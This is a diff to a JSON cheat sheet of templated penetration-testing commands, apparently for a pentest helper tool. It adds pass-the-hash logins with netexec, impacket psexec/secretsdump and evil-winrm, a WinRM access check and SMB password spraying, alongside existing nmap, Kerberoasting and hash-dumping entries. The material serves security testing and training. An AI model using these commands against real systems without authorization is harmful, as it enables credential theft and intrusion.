@@ -11,7 +11,7 @@
   "examples": [
     { "tool": "nmap", "name": "Quick scan (top 1000)", "command": "nmap -sC -sV -oA {OUT}/nmap/quick {TARGET}", "note": "Start here. -sC scripts, -sV versions" },
     { "tool": "nmap", "name": "All ports (fast)", "command": "nmap -p- --min-rate 5000 -oA {OUT}/nmap/allports {TARGET}", "note": "Finds ports the quick scan misses" },
-    { "tool": "nmap", "name": "Deep scan on found ports", "command": "nmap -p {PORTS} -sC -sV -oA {OUT}/nmap/deep {TARGET}", "note": "Put open ports in {PORTS}" },
+    { "tool": "nmap", "name": "Deep scan on found ports", "command": "nmap -p {PORTS} -sC -sV -oA {OUT}/nmap/deep {TARGET}", "note": "Ports fill in from your nmap scans (or type them in the PORTS bar)" },
     { "tool": "nmap", "name": "UDP top 20", "command": "sudo nmap -sU --top-ports 20 -oA {OUT}/nmap/udp {TARGET}", "note": "Needs sudo. Slow, keep small" },
     { "tool": "nmap", "name": "Vuln scripts", "command": "nmap --script vuln -oA {OUT}/nmap/vuln {TARGET}", "note": "Checks known CVEs. Noisy" },
 
@@ -44,6 +44,9 @@
     { "tool": "netexec", "name": "SMB null check", "command": "nxc smb {TARGET} -u '' -p ''", "note": "nxc = netexec (old crackmapexec)" },
     { "tool": "netexec", "name": "SMB login", "command": "nxc smb {TARGET} -u <user> -p <pass>", "note": "+ shows if admin" },
     { "tool": "netexec", "name": "SMB shares", "command": "nxc smb {TARGET} -u <user> -p <pass> --shares", "note": "Lists readable shares" },
+    { "tool": "netexec", "name": "SMB login (hash)", "command": "nxc smb {TARGET} -u <user> -H <hash>", "note": "Pass-the-hash with an NT hash" },
+    { "tool": "netexec", "name": "WinRM login", "command": "nxc winrm {TARGET} -u <user> -p <pass>", "note": "Pwn3d! means you can evil-winrm in" },
+    { "tool": "netexec", "name": "Password spray users", "command": "nxc smb {TARGET} -u {OUT}/users.txt -p <pass> --continue-on-success", "note": "Put usernames in $OUT/users.txt first. Watch the lockout policy" },
 
     { "tool": "rpc", "name": "rpcclient null", "command": "rpcclient -U \"\" -N {TARGET}", "note": "Then: enumdomusers" },
     { "tool": "nfs", "name": "Show NFS mounts", "command": "showmount -e {TARGET}", "note": "Exported network folders" },
@@ -66,8 +69,11 @@
     { "tool": "impacket", "name": "Kerberoast", "command": "impacket-GetUserSPNs {DOMAIN}/<user>:<pass> -dc-ip {TARGET} -request", "note": "Gets crackable service hashes" },
     { "tool": "impacket", "name": "Dump secrets", "command": "impacket-secretsdump {DOMAIN}/<user>:<pass>@{TARGET}", "note": "Needs admin. Dumps hashes" },
     { "tool": "impacket", "name": "psexec shell", "command": "impacket-psexec {DOMAIN}/<user>:<pass>@{TARGET}", "note": "SYSTEM shell if admin" },
+    { "tool": "impacket", "name": "psexec shell (hash)", "command": "impacket-psexec {DOMAIN}/<user>@{TARGET} -hashes :<hash>", "note": "Pass-the-hash" },
+    { "tool": "impacket", "name": "Dump secrets (hash)", "command": "impacket-secretsdump {DOMAIN}/<user>@{TARGET} -hashes :<hash>", "note": "Pass-the-hash" },
 
     { "tool": "evil-winrm", "name": "WinRM shell", "command": "evil-winrm -i {TARGET} -u <user> -p <pass>", "note": "Windows remote shell (port 5985)" },
+    { "tool": "evil-winrm", "name": "WinRM shell (hash)", "command": "evil-winrm -i {TARGET} -u <user> -H <hash>", "note": "Pass-the-hash" },
     { "tool": "ssh", "name": "SSH in", "command": "ssh <user>@{TARGET}", "note": "Classic login" },
     { "tool": "ftp", "name": "FTP connect", "command": "ftp {TARGET}", "note": "Try anonymous / anonymous" },
 
